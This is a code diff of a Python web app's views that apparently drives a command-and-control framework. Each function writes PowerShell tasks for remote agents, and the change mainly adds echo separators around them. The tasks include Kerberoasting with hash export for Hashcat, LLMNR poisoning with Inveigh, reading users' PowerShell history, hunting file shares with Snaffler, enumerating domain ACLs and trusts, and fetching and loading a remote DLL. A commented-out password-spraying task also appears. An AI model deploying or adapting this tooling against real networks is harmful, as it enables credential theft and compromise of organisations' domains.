@@ -34,7 +34,7 @@ def SPNUsersforKerb(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -91,7 +91,7 @@ def ACC_listing(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============useraccount list===============";wmic useraccount list /format:list'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============useraccount list===============";wmic useraccount list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -109,7 +109,7 @@ def Adapter(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============ipconfig /all===============";ipconfig /all'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============ipconfig /all===============";ipconfig /all;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -136,7 +136,7 @@ def ArpTable(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============arp -a===============";arp -a'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============arp -a===============";arp -a;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -155,7 +155,7 @@ def DefenseCheck(request, url='', outpath=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -174,7 +174,7 @@ def systeminfo(request, url='', outpath=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============systeminfo===============";systeminfo'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============systeminfo===============";systeminfo;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -192,7 +192,7 @@ def DomainInfo(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Get-ADDomain===============";Get-ADDomain'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADDomain===============";Get-ADDomain;echo "++++++++++++++++++`r`n"'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -211,7 +211,7 @@ def DomainUsers(request, domain=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;'.format(domain)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;echo "++++++++++++++++++`r`n"'.format(domain)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -230,7 +230,7 @@ def DomainControllers(request, domain=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {}'.format(domain)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {};echo "++++++++++++++++++`r`n"'.format(domain)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -250,7 +250,7 @@ def EnvValue(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Environment values===============";Get-ChildItem Env: | ft Key,Value'       
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Environment values===============";Get-ChildItem Env: | ft Key,Value;echo "++++++++++++++++++`r`n"'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -268,7 +268,7 @@ def GroupsListing(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============group list===============";wmic group list /format:list'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============group list===============";wmic group list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -286,7 +286,7 @@ def Groups(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name;echo "++++++++++++++++++`r`n"'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -307,7 +307,7 @@ def groupInfo(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         group = request.POST['group']
-        task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}" '.format(group)
+        task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}";echo "++++++++++++++++++`r`n" '.format(group)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -319,7 +319,7 @@ def groupInfo(request):
 #enum
 def GroupMembers(request, agent='', groupname=''):
     if request.method=='POST':
-        task = 'echo "===============Group Members===============";Get-ADGroupMember -Identity "{}"'.format(groupname)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Group Members===============";Get-ADGroupMember -Identity "{}";echo "++++++++++++++++++`r`n"'.format(groupname)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -337,7 +337,7 @@ def HotFixes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -355,7 +355,7 @@ def Ip4Route(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============IPv4 routing table===============";route print -4'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============IPv4 routing table===============";route print -4;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -372,7 +372,7 @@ def ListExecPolicies(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List'       
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List;echo "++++++++++++++++++`r`n"'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -390,7 +390,7 @@ def ListingModules(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Get-Module===============";Get-Module'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-Module===============";Get-Module;echo "++++++++++++++++++`r`n"'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -421,7 +421,7 @@ def loggedinUsers(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Logged-in users ===============";qwinsta'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Logged-in users ===============";qwinsta;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -440,7 +440,7 @@ def LocalAccListing(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============System(local) accounts list===============";wmic sysaccount list /format:list'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============System(local) accounts list===============";wmic sysaccount list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -458,7 +458,7 @@ def TrustRelations(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *;echo "++++++++++++++++++`r`n"'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -473,7 +473,7 @@ def TrustRelations(request):
 #powerview
 def TrustMap(request, agent=''):
     if request.method=='POST':
-        task = 'echo "===============Get-DomainTrustMapping===============";import-module $env:USERPROFILE\powerview.ps1;Get-DomainTrustMapping'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-DomainTrustMapping===============";import-module $env:USERPROFILE\powerview.ps1;Get-DomainTrustMapping;;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -690,7 +690,7 @@ def snaffler(request, url='', outpath=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data'.format(url, outpath)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data;echo "++++++++++++++++++`r`n"'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -727,7 +727,7 @@ def processes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task='echo "===============Processes===============";wmic process list /format:list'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Processes===============";wmic process list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -746,7 +746,7 @@ def Dsquery(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task='echo "===============DSquery===============";dsquery {}'.format(arg)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============DSquery===============";dsquery {};echo "++++++++++++++++++`r`n"'.format(arg)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -795,7 +795,7 @@ def TGStickets_powerview(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task='echo "===============TGStickets===============\nOutPut in the following path:\n$env:userprofile";import-module $env:userprofile\powerview.ps1;Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\$env:userprofile\[$env:username]TGS.csv -NoTypeInformation'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============TGStickets===============\nOutPut in the following path:\n$env:userprofile";import-module $env:userprofile\powerview.ps1;Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\$env:userprofile\[$env:username]TGS.csv -NoTypeInformation;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -810,13 +810,13 @@ def TGStickets_powerview(request):
 def test_localAdmin(request, agent='', compName='', user='', password='', domain=''):
     if request.method=='POST':
         if user == '':
-            task = 'echo "===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;Test-AdminAccess -ComputerName {}'.format(compName)    
+            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;Test-AdminAccess -ComputerName {};echo "++++++++++++++++++`r`n"'.format(compName)    
             task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
             with open(task_path, "w") as f:
                 f.write(task)
                 f.close()
         else:
-            task = 'echo "===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;$SecPassword = ConvertTo-SecureString "{password}" -AsPlainText -ForceGet-DomainTrustMapping;$Cred =New-Object System.Management.Automation.PSCredential("{domain}\{user}", $SecPassword);Test-AdminAccess -ComputerName {compName} -Credential $Cred'.format(password,domain,user,compName)    
+            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;$SecPassword = ConvertTo-SecureString "{password}" -AsPlainText -ForceGet-DomainTrustMapping;$Cred =New-Object System.Management.Automation.PSCredential("{domain}\{user}", $SecPassword);Test-AdminAccess -ComputerName {compName} -Credential $Cred;echo "++++++++++++++++++`r`n"'.format(password,domain,user,compName)    
             task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
             with open(task_path, "w") as f:
                 f.write(task)
@@ -830,9 +830,9 @@ def usercommand_history(request):
         user = request.POST['user']
         agent = request.POST['agent']
         if user=='':  #user field is optional
-            task = 'echo "===============Specified user history===============";Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt' 
+            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Specified user history===============";Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt;echo "++++++++++++++++++`r`n"' 
         else:
-            task = 'echo "===============Specified user history===============";Get-Content C:/users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'.format(user)      
+            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Specified user history===============";Get-Content C:/users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt;echo "++++++++++++++++++`r`n"'.format(user)      
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -871,7 +871,7 @@ def GPO_windapsearch(request):
 
 # def pass_spray(request, agent='', password=''):
 #     if request.method=='POST':
-#         task = 'echo "===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
+#         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
 #         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
 #         with open(task_path, "w") as f:
 #             f.write(task)
@@ -895,9 +895,11 @@ def CME_pass_spray(request):
     else:
         return render(request, 'blog/listeners.html')
 
+
+####Need a look to the OutPut-Dir
 def llmnr_poison(request, agent='', time=0):
     if request.method=='POST':
-        task = 'echo "===============Inveigh starting===============";import-module $env:USERPROFILE\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {}'.format(time)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Inveigh starting===============";import-module $env:USERPROFILE\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {};echo "++++++++++++++++++`r`n"'.format(time)
         #####then send the inveigh logs ($env:USERPROFILE\Inveigh-*) files to our machine
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -908,7 +910,7 @@ def llmnr_poison(request, agent='', time=0):
 
 def pass_policy(request, agent=''):
     if request.method=='POST':
-        task = 'echo "===============Password Policy===============";net accounts /DOMAIN'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Password Policy===============";net accounts /DOMAIN;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -919,7 +921,7 @@ def pass_policy(request, agent=''):
 
 def set_execPolicy(request, agent='',policy='',scope=''):
     if request.method=='POST':
-        task = 'echo "===============Set-ExecutionPolicy===============";Set-ExecutionPolicy {} -Scope {}'.format(policy,scope)       
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Set-ExecutionPolicy===============";Set-ExecutionPolicy {} -Scope {};echo "++++++++++++++++++`r`n"'.format(policy,scope)       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -930,7 +932,7 @@ def set_execPolicy(request, agent='',policy='',scope=''):
 
 def snaffler(request, agent='', domain=''):
     if request.method=='POST':
-        task = 'echo "===============Snaffler===============\nOutPut in the following path:\n$env:USERPROFILE";$env:USERPROFILE\Snaffler.exe -d {} -o snaffler.log -v data'.format(domain)       
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Snaffler===============\nOutPut in the following path:\n$env:USERPROFILE";$env:USERPROFILE\Snaffler.exe -d {} -o snaffler.log -v data;echo "++++++++++++++++++`r`n"'.format(domain)       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -947,7 +949,7 @@ def InterestingACL_Enum(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task='echo "===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;Find-InterestingDomainAcl'
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;Find-InterestingDomainAcl;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -967,7 +969,7 @@ def UserACL(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         user = request.POST['user']
-        task='echo "===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}'.format(user)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid};echo "++++++++++++++++++`r`n"'.format(user)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
